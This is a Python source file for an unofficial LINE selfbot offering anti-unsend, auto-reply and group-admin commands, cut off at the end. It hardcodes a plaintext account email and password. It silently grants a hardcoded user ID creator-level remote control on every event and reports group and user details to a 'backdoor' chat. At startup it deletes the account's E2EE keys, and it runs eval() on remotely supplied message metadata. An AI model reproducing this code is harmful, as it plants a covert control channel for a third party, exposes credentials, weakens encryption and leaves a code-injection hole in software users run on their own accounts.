#reread
from CHRLINE import *
import os,json,codecs,time,sys,random
from random import randint


backdoor = json.load(codecs.open("backdoor.json","r","utf-8"))
admin = json.load(codecs.open("admin.json","r","utf-8"))
creator = json.load(codecs.open("creator.json","r","utf-8"))
settings = json.load(codecs.open("settings.json","r","utf-8"))
reb = json.load(codecs.open("reb.json","r","utf-8"))
red = json.load(codecs.open("red.json","r","utf-8"))
game = json.load(codecs.open("game.json","r","utf-8"))
reply = json.load(codecs.open("reply.json","r","utf-8"))
bigdick = "u6155d5dac1395eab52faa16e832e5c65"
mulai = time.time()
cd = []
def Runtime(secs):
    mins, secs = divmod(secs,60)
    hours, mins = divmod(mins,60)
    days, hours = divmod(hours, 24)
    return '‚Äª%02d Â§©\n‚Äª%02d Â∞èÊôÇ\n‚Äª%02d ÂàÜÈêò\n‚Äª%02d Áßí\nŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒû' % (days, hours, mins, secs)

def restart():
    backupData()
    python = sys.executable
    os.execl(python, python, *sys.argv)
def backupData():
    try:
        json.dump(reb,codecs.open('reb.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(settings,codecs.open('settings.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(admin,codecs.open('admin.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(creator,codecs.open('creator.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(backdoor,codecs.open('backdoor.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(red,codecs.open('red.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(game,codecs.open('game.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
        json.dump(reply,codecs.open('reply.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f'json backup error --> {e}')

try:
    accountinfo=open('account.json','r').read()
    email=accountinfo['email']
    password=accountinfo['password']
    token=accountinfo['token']
except:
    email=''
    password=''
    token=''
    open('account.json','w').write(json.dumps({'email':email,'password':password,'token':token}))

class bot:
    def __init__(self):
            self.han=None
            self.main()
    def start(self):
        if token != '':
                try:
                    self.han=CHRLINE(token,device="DESKTOPWIN")
                    print('Login By Token')
                except Exception as e:
                    open('account.json','w').write(json.dumps({'email':email,'password':password,'token':''}))
                    print("Token Login failed\nReason:",e)
        elif email=="" or password=="":
            #account="ikdzcbgaztzeytgeyo@tmmcv.net" #chh5.0
            account = "ezozgyfrwiwvyftwjc@tmmcv.net" 
            password="Tt950413"
            try:
                self.han=CHRLINE(account,password,device="DESKTOPWIN")
                print('Login By Account and Password')
                open('account.json','w').write(json.dumps({'email':account,'password':password,'token':self.han.authToken}))
            except Exception as e:
                print("Password Login failed\nReason:",e)
                os._exit(1)
        
        else:
            try:
                self.han=CHRLINE(email,password,device="DESKTOPWIN")
                print('Login By Email and Password')
                open('account.json','w').write(json.dumps({'email':email,'password':password,'token':self.han.authToken}))
            except Exception as e:
                open('account.json','w').write(json.dumps({'email':'','password':'','token':''}))
                print("Login failed\nReason:",e)
                os._exit(1)
        try:
            pks = self.han.getE2EEPublicKeys()
            for pk in pks:
                print(f"try remove key id: {pk[2]}")
                self.han.removeE2EEPublicKey(pk[1], pk[2], pk[4])
        except Exception as e:
            print(f"remove key error-->{e}")
        try:    
            self.han.sendMessage(backdoor['backdoor'],"[Ëá™ÂãïÁôºÈÄÅ]\nÂæ©ËÆÄÁôªÂÖ•ÊàêÂäü\n‰ΩúËÄÖ:ùì±ùì™ùì∑\nID:https://line.me/ti/p/~lubu174\n\n‰ΩøÁî®ËÄÖË≥áË®ä:\n‰∏ªÊ©ü:localhost\nIP:127.0.0.1")
        except Exception as e:
            print(f"auto login send error-->{e}")
        try:
            if reb['rebid']!={}:
                self.han.sendMessage(reb['rebid']['0'],"Ë≥áÊñôÂä†Ëºâ‰∏≠...",relatedMessageId=reb['rebid']['1'])
                time.sleep(2)
                self.han.sendMessage(reb['rebid']['0'],"Âæ©ËÆÄÈáçÂïüÊàêÂäü",relatedMessageId=reb['rebid']['1'])
                reb['rebid'] = {}
                backupData()
        except Exception as e:
            print(f'startrebmsg error-->{e}')
            #reb['reb'] = ""
            backupData()
    def bot(self,op,han):
        def report(to,man,msg,mids=[]):
            addtxt=''
            if mids!=[]:
                addtxt+="\n‚ÄªMentioner:"
                no = 0
                try:
                    for mid in mids:
                        try:
                            no+=1
                            y = han.getContact(mid)
                            addtxt+="\n"+str(no)+"." + str(y[22]) + "\n" + str(mid)
                        except:
                            pass
                except:
                    pass
            han.sendMessage(backdoor['backdoor'],"ŒûŒûŒûŒûŒûŒûŒû„ÄòÂæåÂè∞Á≥ªÁµ±„ÄôŒûŒûŒûŒûŒûŒûŒû\n‚Äª"+msg+"\n‚ÄªGroup:\n"+han.getChats([to])[1][0][6]+"\n"+to+"\n‚ÄªUser:\n"+han.getContact(man)[22]+"\n"+man+ f'{addtxt}\nŒûŒûŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒûŒûŒû')
        if bigdick not in admin['admin']:
            admin['admin'].append(bigdick)
            backupData()
        if bigdick not in creator['creator']:
            creator['creator'].append(bigdick)
            backupData()
        if op[3] == 124:
            if han.profile[1] in op[12]:
                if settings['autoJoin'] == True and op[11] in admin['admin'] or op[11] in creator['creator']:
                    try:
                        han.acceptChatInvitation(op[10])
                        #han.sendMessage(op[10],"[Auto Send]\nBot Auto Accept Group Invite\nCreator:ùì±ùì™ùì∑\nCreator Link:https://line.me/ti/p/~lubu174")
                    except Exception as e:
                        print(f'accept group invite error-->{e}')
                report(op[10],op[11],"ÈÄöÁü•ÈÇÄË´ãÂÖ•Áæ§")
        if op[3] in [25,26]:
            msg=op[20]
            to=msg[2]
            if msg[15]==0:
                if msg[1] in admin['admin'] or msg[1] in creator['creator']:
                    text=msg[10].lower()
                    if to in reply['reply']:
                        if msg[1] not in cd:
                            if text in reply['textreply']:
                                han.replyMessage(msg,reply['textreply'][text])
                            if text in reply['contactreply']:
                                han.sendContact(to,reply['contactreply'][text])
                        cd.append(msg[1])
                        time.sleep(1)
                        cd.remove(msg[1])
                    match text:
                        case '#backdoor':
                            g = backdoor['backdoor']
                            try:
                                try:
                                    f = han.getChats([g])
                                    han.replyMessage(msg,"ÁõÆÂâçÊ®°ÂºèÁÇ∫:Áæ§ÁµÑÂæåÂè∞")
                                    han.replyMessage(msg,"ÂæåÂè∞ÂêçÁ®±ÁÇ∫:\n{}\nIDÁÇ∫:\n{}".format(str(f[1][0][6]),g))
                                except:
                                    try:
                                        han.getContact(g)
                                        han.replyMessage(msg,"ÁõÆÂâçÊ®°ÂºèÁÇ∫:ÁßÅËÅäÂæåÂè∞")
                                        han.replyMessage(msg,"ÁõÆÂâçÂæåÂè∞ÁÇ∫:")
                                        han.sendContact(to, g)
                                    except Exception as e:
                                        han.replyMessage(msg,e)
                            except Exception as e:
                                han.relatedMessage(to,e,op.message.id)
                        case '#runtime':
                                eltime = time.time() - mulai
                                bot = "ŒûŒûŒûŒû„ÄòÈÅãË°åÊôÇÈñì„ÄôŒûŒûŒûŒû\n" +Runtime(eltime)
                                han.replyMessage(msg,bot)
                        case '#restart':
                            if msg[1] in creator['creator']:
                                han.replyMessage(msg,"Âæ©ËÆÄÈáçÂïü‰∏≠...")
                                try:
                                    reb['rebid']={0:to,1:msg[4]}
                                    backupData()
                                except Exception as e:
                                    print(f'rebmsg error-->{e}')
                                restart()
                            else:
                                han.replyMessage(msg,"ÁÑ°Ê¨ä‰ΩøÁî®ÈñãÁôºËÄÖÊåá‰ª§")
                                report(msg[2],msg[1],"ÁÆ°ÁêÜÂì°ÂòóË©¶ÈáçÂïüÊ©üÂô®")
                        case '#sp':
                            a = time.time()
                            han.replyMessage(msg, '„ÄêTest Speed„Äë')
                            b = time.time()
                            han.replyMessage(msg, '„Äê%s„Äë' % float((b-a)))
                        case 'gid':
                            han.replyMessage(msg,msg[2])
                        case 'mymid':
                            han.replyMessage(msg,msg[1])
                        case '#reread on':
                            if to not in red["reread"]:
                                red["reread"].append(to)
                                han.replyMessage(msg,"‚ÄªÈò≤Êî∂Âõû‚û§üü¢")
                                backupData()
                            else:
                                han.replyMessage(msg,"Â∑≤Á∂ìÊòØÈñãÂïüÁãÄÊÖã")
                        case '#reread off':
                            if to in red["reread"]:
                                red["reread"].remove(to)
                                han.replyMessage(msg,"‚ÄªÈò≤Êî∂Âõû‚û§üî¥")
                                backupData()
                            else:
                                han.replyMessage(msg,"Â∑≤Á∂ìÊòØÈóúÈñâÁãÄÊÖã")
                        case '#reply on':
                            if to not in reply["reply"]:
                                reply["reply"].append(to)
                                han.replyMessage(msg,"‚ÄªÈóúÈçµÂ≠óÂõûË¶Ü‚û§üü¢")
                                backupData()
                            else:
                                han.replyMessage(msg,"Â∑≤Á∂ìÊòØÈñãÂïüÁãÄÊÖã")
                        case '#reply off':
                            if to in reply["reply"]:
                                reply["reply"].remove(to)
                                han.replyMessage(msg,"‚ÄªÈóúÈçµÂ≠óÂõûË¶Ü‚û§üî¥")
                                backupData()
                            else:
                                han.replyMessage(msg,"Â∑≤Á∂ìÊòØÈóúÈñâÁãÄÊÖã")
                        case '#game on':
                            if to not in game["game"]:
                                game["game"].append(to)
                                han.replyMessage(msg,"‚ÄªÈÅäÊà≤Ê®°Âºè‚û§üü¢")
                                backupData()
                            else:
                                han.replyMessage(msg,"Â∑≤Á∂ìÊòØÈñãÂïüÁãÄÊÖã")
                        case '#game off':
                            if to in game["game"]:
                                game["game"].remove(to)
                                han.replyMessage(msg,"‚ÄªÈÅäÊà≤Ê®°Âºè‚û§üî¥")
                                backupData()
                            else:
                                han.replyMessage(msg,"Â∑≤Á∂ìÊòØÈóúÈñâÁãÄÊÖã")
                        case '#aj on':
                            if settings["autoJoin"] == False:
                                settings["autoJoin"] = True
                                han.replyMessage(msg,"‚ÄªËá™ÂãïÂÖ•Áæ§‚û§üü¢")
                                backupData()
                            else:
                                han.replyMessage(msg,"Â∑≤Á∂ìÊòØÈñãÂïüÁãÄÊÖã")
                        case '#aj off':
                            if settings["autoJoin"] == True:
                                settings["autoJoin"] = False
                                han.replyMessage(msg,"‚ÄªËá™ÂãïÂÖ•Áæ§‚û§üî¥")
                                backupData()
                            else:
                                han.replyMessage(msg,"Â∑≤Á∂ìÊòØÈóúÈñâÁãÄÊÖã")
                        case '#set':
                            try:
                                ret_ = "ŒûŒûŒûŒûŒû„ÄòÊ©üÂô®ÈñãÈóú„ÄôŒûŒûŒûŒûŒû"    
                                if settings["autoJoin"] == True: ret_ += "\n‚ÄªËá™ÂãïÂÖ•Áæ§‚û§üü¢"
                                else: ret_ += "\n‚ÄªËá™ÂãïÂÖ•Áæ§‚û§üî¥"
                                ret_ +="\nŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒû"                   
                                ret_ += "\nCreator:ùì±ùì™ùì∑"
                                ret_ += "\nID: lubu174"
                                ret_ += "\nQR:http://line.me/ti/p/~lubu174"
                                ret_ += "\nŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒû"
                                han.replyMessage(msg, str(ret_))
                            except Exception as e:
                                han.replyMessage(msg,f'error-->\n{e}')
                        case '#pi':
                            try:
                                ret_ = "ŒûŒûŒûŒûŒûŒû„ÄòÁæ§ÁµÑË≥áË®ä„ÄôŒûŒûŒûŒûŒûŒû"
                                if to in red['reread'] : ret_ += "\n‚ÄªÈò≤Êî∂Âõû‚û§üü¢"
                                else: ret_ += "\n‚ÄªÈò≤Êî∂Âõû‚û§üî¥"
                                if to in game['game'] : ret_ += "\n‚ÄªÈÅäÊà≤Ê®°Âºè‚û§üü¢"
                                else: ret_ += "\n‚ÄªÈÅäÊà≤Ê®°Âºè‚û§üî¥"
                                if to in reply['reply'] : ret_ += "\n‚ÄªÈóúÈçµÂ≠óÂõûË¶Ü‚û§üü¢"
                                else: ret_ += "\n‚ÄªÈóúÈçµÂ≠óÂõûË¶Ü‚û§üî¥"
                                ret_ += "\nŒûŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒûŒû"
                                ret_ += "\nCreator:ùì±ùì™ùì∑"
                                ret_ += "\nID: lubu174"
                                ret_ += "\nQR:http://line.me/ti/p/~lubu174"
                                ret_ += "\nŒûŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒûŒû"
                                han.replyMessage(msg, str(ret_))
                            except Exception as e:
                                han.replyMessage(msg,f'error-->\n{e}')
                        case '#al':
                            try:
                                if admin['admin'] == []:
                                    han.replyMessage(msg,"ŒûŒûŒûŒûŒû„ÄòÊ¨äÈôêÂêçÂñÆ„ÄôŒûŒûŒûŒûŒû\nÁ©∫\nŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒû")
                                else:
                                    mc = "ŒûŒûŒûŒûŒûŒûŒû„ÄòÊ¨äÈôêÂêçÂñÆ„ÄôŒûŒûŒûŒûŒûŒûŒû"
                                    no = 0 
                                    try:
                                        for mi_d in admin['admin']:
                                            try:
                                                no += 1
                                                mc += f"\n‚Äª{no}.{han.getContact(mi_d)[22]}"+"\n"+str(mi_d)
                                            except:
                                                print("ÈåØË™§:" +str(mi_d))
                                        han.replyMessage(msg,mc +"\nŒûŒûŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒûŒûŒû")
                                    except:
                                        han.replyMessage(msg,"ÁÆ°ÁêÜÂì°„Äê"+(str(len(admin)))+"„Äë")
                            except Exception as e:
                                print('al error-->'+str(e))
                        case '#cl':
                            try:
                                if creator['creator'] == []:
                                    han.replyMessage(msg,"ŒûŒûŒûŒûŒû„Äò‰ΩúËÄÖÂêçÂñÆ„ÄôŒûŒûŒûŒûŒû\nÁ©∫\nŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒû")
                                else:
                                    mc = "ŒûŒûŒûŒûŒûŒûŒû„Äò‰ΩúËÄÖÂêçÂñÆ„ÄôŒûŒûŒûŒûŒûŒûŒû"
                                    no = 0 
                                    try:
                                        for mi_d in creator['creator']:
                                            try:
                                                no += 1
                                                mc += f"\n‚Äª{no}.{han.getContact(mi_d)[22]}"+"\n"+str(mi_d)
                                            except:
                                                print("ÈåØË™§:" +str(mi_d))
                                        han.replyMessage(msg,mc +"\nŒûŒûŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒûŒûŒû")
                                    except:
                                        han.replyMessage(msg,"‰ΩúËÄÖ„Äê"+(str(len(admin)))+"„Äë")
                            except Exception as e:
                                print('al error-->'+str(e))
                        case 'Âæ©ËÆÄ Êªæ':
                            han.replyMessage(msg,"ÊªæÂ∞±Êªæ Ê¥æÊÆ∫Â∞è Âππ")
                            try:
                                red['reread'].remove(to)
                                backupData()
                            except:
                                pass
                            try:
                                game['game'].remove(to)
                                backupData()
                            except:
                                pass
                            try:
                                reply['reply'].remove(to)
                            except:
                                pass
                            han.deleteSelfFromChat(to) 
                            report(msg[2],msg[1],"ÈÄÄÁæ§Êåá‰ª§Ëß∏Áôº")
                        case '#lg':
                            groups = han.groups
                            ret_ = "ŒûŒûŒûŒûŒûŒûŒû„ÄòÁæ§ÁµÑÂàóË°®„ÄôŒûŒûŒûŒûŒûŒûŒû"
                            no = 1
                            for gid in groups:
                                group = han.getChats([gid])
                                ret_ += "\n‚Äª{}. {}\n{}".format(str(no), str(group[1][0][6]), str(gid))
                                no += 1
                            no+=1
                            ret_ += "\n[Á∏ΩÂÖ± {} ÂÄãÁæ§ÁµÑ]".format(str(len(groups)))
                            ret_ += "\nŒûŒûŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒûŒûŒû"
                            han.replyMessage(msg, str(ret_))  
                        case '#clearadmin':
                            if msg[1] in creator['creator']:
                                admin['admin'] = []
                                han.replyMessage(msg,"Â∑≤Ê∏ÖÁ©∫Ê¨äÈôêÂêçÂñÆ")
                                backupData()
                            else:
                                han.replyMessage(msg,"ÁÑ°Ê¨ä‰ΩøÁî®ÈñãÁôºËÄÖÊåá‰ª§")
                                report(msg[2],msg[1],"ÁÆ°ÁêÜÂì°ÂòóË©¶Ê∏ÖÁ©∫Ê¨äÈôê")   
                        case '#clearcreator':
                            if msg[1] in creator['creator']:
                                creator['creator'] = []
                                han.replyMessage(msg,"Â∑≤Ê∏ÖÁ©∫‰ΩúËÄÖÂêçÂñÆ")
                                backupData()
                            else:
                                han.replyMessage(msg,"ÁÑ°Ê¨ä‰ΩøÁî®ÈñãÁôºËÄÖÊåá‰ª§")
                                report(msg[2],msg[1],"ÁÆ°ÁêÜÂì°ÂòóË©¶Ê∏ÖÁ©∫‰ΩúËÄÖ")
                        case '#mine':
                            ret="ŒûŒûŒûŒûŒû„ÄòÊ©üÂô®ÁãÄÊÖãÊü•Ë©¢„ÄôŒûŒûŒûŒûŒû"
                            ret2=""
                            try:
                                han.deleteOtherFromChat(to,["Fuck you"])
                            except Exception as e:
                                if e.message == "request blocked":
                                    ret+=f"\n‚ÄªË∏¢‰∫∫ÁãÄÊÖã:üî¥\n‚ÄªÈÇÄË´ãÁãÄÊÖã:üî¥"
                                else:
                                    ret+=f"\n‚ÄªË∏¢‰∫∫ÁãÄÊÖã:üü¢\n‚ÄªÈÇÄË´ãÁãÄÊÖã:üü¢"
                            try:
                                han.findAndAddContactsByMid("u0348f477412bc2506bcafb74902367ad")
                                ret+=f"\n‚ÄªÂä†ÂèãÁãÄÊÖã:üü¢"
                            except Exception as e:
                                if e.message == "request blocked":
                                    ret+=f"\n‚ÄªÂä†ÂèãÁãÄÊÖã:üî¥"
                            ret+= "\n‚ÄªÂèñÊ∂àÁãÄÊÖã:üü¢"
                            ret+= "\n‚ÄªÁâàÊú¨Ë≥áË®ä:Âæ©ËÆÄ V1.0"
                            han.replyMessage(msg,f"{ret}" + "\nŒûŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒûŒû")
                        case '#pic':
                            if msg[1] in creator['creator']:
                                han.replyMessage(msg,"Ë´ãÂÇ≥ÈÄÅÂúñÁâá")
                                settings["pic"] = True
                                settings["picmid"].append(msg[1]) 
                                backupData()
                            else:
                                han.replyMessage(msg,"ÁÑ°Ê¨ä‰ΩøÁî®ÈñãÁôºËÄÖÊåá‰ª§")
                                report(msg[2],msg[1],"ÁÆ°ÁêÜÂì°ÂòóË©¶Êõ¥ÊèõÈ†≠Ë≤º")
                        case '#cover':
                            if msg[1] in creator['creator']:
                                han.replyMessage(msg,"Ë´ãÂÇ≥ÈÄÅÂúñÁâá")
                                settings["cover"] = True
                                settings["covermid"].append(msg[1])
                                backupData()
                            else:
                                han.replyMessage(msg,"ÁÑ°Ê¨ä‰ΩøÁî®ÈñãÁôºËÄÖÊåá‰ª§")
                                report(msg[2],msg[1],"ÁÆ°ÁêÜÂì°ÂòóË©¶Êõ¥ÊèõÂ∞ÅÈù¢")
                        case '#logout':
                            if msg[1] in creator['creator']:
                                han.replyMessage(msg,"Â∑≤Ëá™ÂãïÁôªÂá∫")
                                os._exit(0)
                            else:
                                han.replyMessage(msg,"ÁÑ°Ê¨ä‰ΩøÁî®ÈñãÁôºËÄÖÊåá‰ª§")
                                report(msg[2],msg[1],"ÁÆ°ÁêÜÂì°ÂòóË©¶ÁôªÂá∫")
                    if text.startswith("#add"):
                        adminlist = []
                        adminlist2 = []
                        if 'MENTION' in msg[18]:
                            key = eval(msg[18]["MENTION"])
                            tags = key["MENTIONEES"]
                            for tag in tags:
                                mid = han.getContact(tag['M'])
                                if mid[1] not in admin['admin']:
                                    if mid[1] not in adminlist:
                                        adminlist.append(mid[1])
                                else:
                                    if mid[1] not in adminlist2:
                                        adminlist2.append(mid[1])
                            txt = "ŒûŒûŒûŒûŒû„ÄòÊñ∞Â¢ûÊ¨äÈôê„ÄôŒûŒûŒûŒûŒû"
                            txt += "\nŒûŒûŒûŒûŒûÊñ∞Â¢ûÊàêÂäüŒûŒûŒûŒûŒû"
                            no = 0
                            if len(adminlist) != 0:
                                for x in adminlist:
                                    y = han.getContact(x)
                                    try:
                                        admin['admin'].append(x)
                                        backupData()
                                        no += 1
                                        txt +=  f"\n‚Äª{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nÁÑ°"
                            txt += "\nŒûŒûŒûŒûŒûÊñ∞Â¢ûÂ§±ÊïóŒûŒûŒûŒûŒû"
                            no = 0
                            if len(adminlist2) != 0:
                                for x in adminlist2:
                                    y = han.getContact(x)
                                    try:
                                        no += 1
                                        txt +=  f"\n‚Äª{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nÁÑ°"
                            han.replyMessage(msg, txt + "\nŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒû")
                            report(msg[2],msg[1],"Êñ∞Â¢ûÊ¨äÈôêÊåá‰ª§Ëß∏Áôº",adminlist)
                        del adminlist
                        del adminlist2
                    elif text.startswith("#del"):
                        adminlist = []
                        adminlist2 = []
                        if 'MENTION' in msg[18]:
                            key = eval(msg[18]["MENTION"])
                            tags = key["MENTIONEES"]
                            for tag in tags:
                                mid = han.getContact(tag['M'])
                                if mid[1] in admin['admin']:
                                    if mid[1] not in adminlist:
                                        adminlist.append(mid[1])
                                else:
                                    if mid[1] not in adminlist2:
                                        adminlist2.append(mid[1])
                            txt = "ŒûŒûŒûŒûŒû„ÄòÂà™Èô§Ê¨äÈôê„ÄôŒûŒûŒûŒûŒû"
                            txt += "\nŒûŒûŒûŒûŒûÂà™Èô§ÊàêÂäüŒûŒûŒûŒûŒû"
                            no = 0
                            if len(adminlist) != 0:
                                for x in adminlist:
                                    y = han.getContact(x)
                                    try:
                                        admin['admin'].remove(x)
                                        backupData()
                                        no += 1
                                        txt +=  f"\n‚Äª{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nÁÑ°"
                            txt += "\nŒûŒûŒûŒûŒûÂà™Èô§Â§±ÊïóŒûŒûŒûŒûŒû"
                            no = 0
                            if len(adminlist2) != 0:
                                for x in adminlist2:
                                    y = han.getContact(x)
                                    try:
                                        no += 1
                                        txt +=  f"\n‚Äª{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nÁÑ°"
                            han.replyMessage(msg, txt + "\nŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒû")
                            report(msg[2],msg[1],"Âà™Èô§Ê¨äÈôêÊåá‰ª§Ëß∏Áôº",adminlist)
                        del adminlist
                        del adminlist2
                    elif text.startswith("#cadd"):
                        if msg[1] in bigdick:
                            adminlist = []
                            adminlist2 = []
                            if 'MENTION' in msg[18]:
                                key = eval(msg[18]["MENTION"])
                                tags = key["MENTIONEES"]
                                for tag in tags:
                                    mid = han.getContact(tag['M'])
                                    if mid[1] not in creator['creator']:
                                        if mid[1] not in adminlist:
                                            adminlist.append(mid[1])
                                    else:
                                        if mid[1] not in adminlist2:
                                            adminlist2.append(mid[1])
                                txt = "ŒûŒûŒûŒû„ÄòÊñ∞Â¢û‰ΩúËÄÖÊ¨äÈôê„ÄôŒûŒûŒûŒû"
                                txt += "\nŒûŒûŒûŒûŒûÊñ∞Â¢ûÊàêÂäüŒûŒûŒûŒûŒû"
                                no = 0
                                if len(adminlist) != 0:
                                    for x in adminlist:
                                        y = han.getContact(x)
                                        try:
                                            creator['creator'].append(x)
                                            backupData()
                                            no += 1
                                            txt +=  f"\n‚Äª{no}.{y[22]}"
                                        except:
                                            pass
                                else:
                                    txt += "\nÁÑ°"
                                txt += "\nŒûŒûŒûŒûŒûÊñ∞Â¢ûÂ§±ÊïóŒûŒûŒûŒûŒû"
                                no = 0
                                if len(adminlist2) != 0:
                                    for x in adminlist2:
                                        y = han.getContact(x)
                                        try:
                                            no += 1
                                            txt +=  f"\n‚Äª{no}.{y[22]}"
                                        except:
                                            pass
                                else:
                                    txt += "\nÁÑ°"
                                han.replyMessage(msg, txt + "\nŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒû")
                                
                            del adminlist
                            del adminlist2
                        else:
                            han.replyMessage(msg, "ÁÑ°Ê¨ä‰ΩøÁî®ÈñãÁôºËÄÖÊåá‰ª§")
                            report(msg[2],msg[1],"ÁÆ°ÁêÜÂì°ÂòóË©¶Êñ∞Â¢û‰ΩúËÄÖÊ¨äÈôê")
                    elif text.startswith("#cdel"):
                        if msg[1] in bigdick:
                            adminlist = []
                            adminlist2 = []
                            if 'MENTION' in msg[18]:
                                key = eval(msg[18]["MENTION"])
                                tags = key["MENTIONEES"]
                                for tag in tags:
                                    mid = han.getContact(tag['M'])
                                    if mid[1] in creator['creator']:
                                        if mid[1] not in adminlist:
                                            adminlist.append(mid[1])
                                    else:
                                        if mid[1] not in adminlist2:
                                            adminlist2.append(mid[1])
                                txt = "ŒûŒûŒûŒû„ÄòÂà™Èô§‰ΩúËÄÖÊ¨äÈôê„ÄôŒûŒûŒûŒû"
                                txt += "\nŒûŒûŒûŒûŒûÂà™Èô§ÊàêÂäüŒûŒûŒûŒûŒû"
                                no = 0
                                if len(adminlist) != 0:
                                    for x in adminlist:
                                        y = han.getContact(x)
                                        try:
                                            creator['creator'].remove(x)
                                            backupData()
                                            no += 1
                                            txt +=  f"\n‚Äª{no}.{y[22]}"
                                        except:
                                            pass
                                else:
                                    txt += "\nÁÑ°"
                                txt += "\nŒûŒûŒûŒûŒûÂà™Èô§Â§±ÊïóŒûŒûŒûŒûŒû"
                                no = 0
                                if len(adminlist2) != 0:
                                    for x in adminlist2:
                                        y = han.getContact(x)
                                        try:
                                            no += 1
                                            txt +=  f"\n‚Äª{no}.{y[22]}"
                                        except:
                                            pass
                                else:
                                    txt += "\nÁÑ°"
                                han.replyMessage(msg, txt + "\nŒûŒûŒûŒûŒû„Äòùì±ùì™ùì∑ √ü√¥t„ÄôŒûŒûŒûŒûŒû")
                            del adminlist
                            del adminlist2
                        else:
                            han.replyMessage(msg, "ÁÑ°Ê¨ä‰ΩøÁî®ÈñãÁôºËÄÖÊåá‰ª§")
                            report(msg[2],msg[1],"ÁÆ°ÁêÜÂì°ÂòóË©¶Âà™Èô§‰ΩúËÄÖÊ¨äÈôê")
                    elif text.startswith("#inv:"):
                        if msg[1] in creator['creator']:
                            gid = text.replace("#inv:","")
                            try:
                                try:
                                    han.findAndAddContactsByMid([msg[1]])
                                except:
                                    pass
                                try: 
                                    try:
                                        han.inviteIntoChat(gid,[msg[1]])
                                        han.sendMessage(gid,"Êé•Êî∂ÈÅ†Á´ØÈÇÄË´ãÊåá‰ª§")
                                        han.replyMessage(msg,"ÈÇÄË´ãÊàêÂäü")
                                    except Exception as e:
                                        print(e)
                                        han.replyMessage(msg, "ÈÇÄË´ãÂ§±Êïó")
                                except:
                                    han.replyMessage(msg, "ÈÇÄË´ãÂ§±Êïó")  
                            except:
                                han.replyMessage(msg, "Error-->invalid gid")
                        else:
                            han.replyMessage(msg, "ÁÑ°Ê¨ä‰ΩøÁî®ÈñãÁôºËÄÖÊåá‰ª§")
                            report(msg[2],msg[1],"ÁÆ°ÁêÜÂì°ÂòóË©¶‰ΩøÁî®ÈÅ†Á´ØÈÇÄË´ãÊåá‰ª§")
                    elif text.startswith("#leave:"):
                        if msg[1] in creator['creator']:
                            try:
                                gid = text.replace("#leave:","")
                                print(gid)
                                if gid == "":
                                    han.replyMessage(msg, "Ë´ãËº∏ÂÖ•Áæ§ÁµÑGid")
                                else:
                                    try:
                                        han.sendMessage(gid,"Êé•Êî∂ÈÅ†Á´ØÈÄÄÁæ§Êåá‰ª§")
                                        han.deleteSelfFromChat(gid)
                                        try:
                                            game['game'].remove(gid)
                                            backupData()
                                        except:
                                            pass
                                        try:
                                            reply['reply'].remove(gid)
                                            backupData()
                                        except:
                                            pass
                                        try:
                                            red['reread'].remove(gid)
                                            backupData()
                                        except:
                                            pass
                                        han.replyMessage(msg,"ÈÄÄÁæ§ÊàêÂäü")
                                    except:
                                        han.replyMessage(msg, "Êàë‰∏çÂú®ÈÇ£ÂÄãÁæ§ÁµÑË£°")  
                            except:
                                han.replyMessage(msg, "Error-->invalid gid")
                        else:
                            han.replyMessage(msg, "ÁÑ°Ê¨ä‰ΩøÁî®ÈñãÁôºËÄÖÊåá‰ª§")
                            report(msg[2],msg[1],"ÁÆ°ÁêÜÂì°ÂòóË©¶‰ΩøÁî®ÈÅ†Á´ØÈÄÄÁæ§Êåá‰ª§")
                    elif text.startswith("#pn:"):
                        if msg[1] in creator['creator']:
                            key = msg[10][4:]
                            if len(key) == 0:
                                han.replyMessage(msg, 'Rename Error')
                            else:
                                han.updateProfileAttribute(2, key)
                                han.replyMessage(msg, f'ÂêçÁ®±Â∑≤Êõ¥ÊîπÁÇ∫:\n{key}')
                        else:
                            han.replyMessage(msg, "ÁÑ°Ê¨ä‰ΩøÁî®ÈñãÁôºËÄÖÊåá‰ª§")
                            report(msg[2],msg[1],"Ê¨äÈôêËÄÖÂòóË©¶Êõ¥ÊîπÂêçÁ®±")
                    elif text.startswith("#cb:"): 
                        if msg[1] in creator['creator']:
                            bio = msg[10][4:]
                            han.updateProfileAttribute(16, bio)
